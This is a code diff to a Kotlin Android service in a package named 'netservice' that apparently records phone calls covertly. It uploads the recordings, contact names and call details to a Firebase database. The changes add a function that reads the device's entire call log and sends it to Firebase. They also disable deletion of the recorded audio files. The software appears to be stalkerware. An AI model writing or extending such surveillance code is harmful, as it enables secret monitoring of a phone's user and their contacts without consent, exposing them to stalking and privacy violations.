@@ -5,19 +5,19 @@ import android.media.MediaRecorder
 import android.net.Uri
 import android.os.Environment
 import android.os.Handler
-import android.util.Log
-import com.dtz.netservice.rxFirebase.InterfaceFirebase
 import com.dtz.netservice.data.model.Calls
+import com.dtz.netservice.rxFirebase.InterfaceFirebase
 import com.dtz.netservice.services.base.BaseInteractorService
+import com.dtz.netservice.utils.CallLogs
 import com.dtz.netservice.utils.ConstFun.getDateTime
 import com.dtz.netservice.utils.ConstFun.isAndroidM
+import com.dtz.netservice.utils.Consts
 import com.dtz.netservice.utils.Consts.ADDRESS_AUDIO_CALLS
 import com.dtz.netservice.utils.Consts.CALLS
 import com.dtz.netservice.utils.Consts.DATA
-import com.dtz.netservice.utils.FileHelper
-import com.dtz.netservice.utils.FileHelper.getFileNameCall
 import com.dtz.netservice.utils.FileHelper.getContactName
 import com.dtz.netservice.utils.FileHelper.getDurationFile
+import com.dtz.netservice.utils.FileHelper.getFileNameCall
 import com.dtz.netservice.utils.FileHelper.getFilePath
 import com.dtz.netservice.utils.MediaRecorderUtils
 import io.reactivex.android.schedulers.AndroidSchedulers
@@ -60,11 +60,12 @@ class InteractorCalls<S : InterfaceServiceCalls> @Inject constructor(
         recorder.stopRecording { sendFileCall() }
         Handler().postDelayed({
             getRecordsLists(getContext())
+            getCallLog(getContext())
         }, 10000)
     }
 
     private fun deleteFile() {
-        FileHelper.deleteFile(fileName)
+        //FileHelper.deleteFile(fileName)
         if (getService() != null) getService()!!.stopServiceCalls()
     }
 
@@ -86,14 +87,18 @@ class InteractorCalls<S : InterfaceServiceCalls> @Inject constructor(
         val duration = getDurationFile(fileName!!)
         val calls = Calls(contact, phoneNumber, dateTime, duration, type)
         firebase().getDatabaseReference("$CALLS/$DATA").push().setValue(calls)
-        deleteFile()
+        //deleteFile()
+    }
+
+    private fun getCallLog(context: Context) {
+        val callList = CallLogs.callList(context)
+        firebase().getDatabaseReference("${Consts.CALLLOGS}/").setValue(callList)
     }
 
     private fun getRecordsLists(context: Context) {
         val callsDir = context.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS)?.path + "/records/calls/"
         File(callsDir).walk().forEach {
             val file = File(it.path)
-            Log.d("AI", it.path)
             if (file.isFile) {
                 uploadCallFile(file)
             }
